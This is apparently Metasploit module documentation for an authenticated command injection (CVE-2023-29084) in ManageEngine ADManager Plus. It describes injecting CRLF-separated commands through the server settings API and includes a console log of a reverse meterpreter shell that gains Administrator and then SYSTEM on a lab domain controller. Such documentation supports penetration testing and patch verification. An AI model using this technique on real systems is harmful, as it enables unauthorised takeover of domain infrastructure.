## Vulnerable Application
ManageEngine ADManager Plus prior to build 7181 is vulnerable to an authenticated command injection due to insufficient
validation of user input when performing the `ChangePasswordAction` function before passing it into a string that is later
used as an OS command to execute. 

By making a POST request to `/api/json/admin/saveServerSettings` with a `params` POST
parameter containing a JSON array object that has a `USERNAME` or `PASSWORD` element containing a 
carriage return and newline, followed by the command the attacker wishes to execute, an attacker can gain RCE as the user
running ADManager Plus, which will typically be the local administrator. 

Note that the attacker must be authenticated in order to send requests to `/api/json/admin/saveServerSettings`, 
so this vulnerability does require authentication to exploit.

As this exploit modifies the HTTP proxy settings for the entire server, one cannot use fetch payloads
with this exploit, since these will use HTTP connections that will be affected by the change in configuration.

## Verification Steps

1. Set up a Windows Server target as a domain controller server.
2. Download https://web.archive.org/web/20220926012908if_/https://download.manageengine.com/products/ad-manager/13024552/ManageEngine_ADManager_Plus_64.exe onto the target and run through the setup window, accepting defaults.
3. Start `msfconsole`
4. `set RHOST *target IP*`
5. `set LHOST *local IP address*`
6. `set SRVHOST *local IP address*` <- This step is optional depending on payload.
7. `exploit`
8. You should get a shell back as the local administrator user on the target machine.

## Options

### USERNAME
Username to log into ADManager Plus as.

### PASSWORD
Password to log into ADManager Plus with.

### DOMAIN
Domain to log into ADManager Plus with or `ADManager Plus Authentication`.

## Scenarios

### ManageEngine ADManager Plus Build 7151 on Windows Server 2022
```
msf6 exploit(windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection) > show options

Module options (exploit/windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection):

   Name      Current Setting                Required  Description
   ----      ---------------                --------  -----------
   DOMAIN    ADManager Plus Authentication  yes       The domain to log into
   PASSWORD  admin                          yes       The password to log in with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    192.168.64.149                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     9090                           yes       The target port (TCP)
   SSL       false                          no        Negotiate SSL/TLS for outgoing connections
   USERNAME  admin                          yes       The user to log into ADManager Plus as
   VHOST                                    no        HTTP server virtual host


Payload options (cmd/windows/powershell/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.64.128   yes       The listen address (an interface may be specified)
   LPORT     8899             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection) > exploit

[*] Started reverse TCP handler on 192.168.64.128:8899 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is running AdManager Plus build 7151!
[+] The target appears to be vulnerable. Target appears to be running a vulnerable version of AdManager Plus!
[+] Logged in successfully!
[*] Sending stage (175686 bytes) to 192.168.64.149
[*] Meterpreter session 3 opened (192.168.64.128:8899 -> 192.168.64.149:57276) at 2023-05-25 15:32:08 -0500
[+] Request timed out. Its likely the payload executed successfully!

meterpreter > getuid
Server username: DAFOREST\Administrator
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeDelegateSessionUserImpersonatePrivilege
SeEnableDelegationPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeMachineAccountPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > 
```
